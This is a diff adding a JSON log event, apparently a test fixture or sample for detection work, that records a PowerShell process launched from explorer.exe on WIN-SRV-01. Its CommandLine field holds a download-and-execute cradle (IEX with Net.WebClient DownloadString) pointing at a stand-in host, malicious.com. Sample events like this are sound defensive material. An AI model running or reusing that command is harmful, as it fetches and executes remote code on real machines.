@@ -1,0 +1,8 @@
+{
+  "EventID": 1,
+  "Computer": "WIN-SRV-01",
+  "ProcessName": "powershell.exe",
+  "CommandLine": "powershell -nop -c IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')",
+  "ParentProcessName": "explorer.exe",
+  "Timestamp": "2026-05-10T10:00:00Z"
+}
